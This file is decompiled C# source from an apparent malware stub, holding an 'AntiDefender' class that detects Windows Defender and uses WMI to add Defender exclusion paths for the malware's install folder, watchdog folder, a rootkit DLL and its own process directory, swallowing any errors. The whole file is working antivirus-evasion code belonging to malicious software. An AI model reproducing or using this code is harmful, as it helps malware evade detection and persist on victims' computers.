using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000003 RID: 3
	internal class AntiDefender
	{
		// Token: 0x06000004 RID: 4 RVA: 0x00002524 File Offset: 0x00000724
		public static void AntiScan()
		{
			if (!Methods.Antivirus().ToLower().Contains("defender"))
			{
				return;
			}
			try
			{
				string str = null;
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(@"root\Microsoft\Windows\Defender", "SELECT * FROM MSFT_MpPreference").Get())
				{
					str = ((ManagementObject)managementBaseObject)["ComputerID"].ToString();
				}
				string pathString = "MSFT_MpPreference.ComputerID='" + str + "'";
				ManagementObject managementObject = new ManagementObject(@"root\Microsoft\Windows\Defender", pathString, null);
				ManagementBaseObject methodParameters = managementObject.GetMethodParameters("Add");
				List<string> list = new List<string>();
				if (Convert.ToBoolean(Settings.Install))
				{
					list.Add(new FileInfo(Settings.PathClient).Directory.FullName);
				}
				if (Convert.ToBoolean(Settings.InstallWatchDog))
				{
					list.Add(new FileInfo(Settings.PathWatchDog).Directory.FullName);
				}
				if (Convert.ToBoolean(Settings.ROOTKIT))
				{
					list.Add(Path.Combine(Methods.GetPath("%Windows%"), "xdwd.dll"));
				}
				list.Add(new FileInfo(Settings.ProcessPath).Directory.FullName);
				methodParameters["ExclusionPath"] = list.ToArray();
				managementObject.InvokeMethod("Add", methodParameters, null);
			}
			catch
			{
			}
		}
	}
}
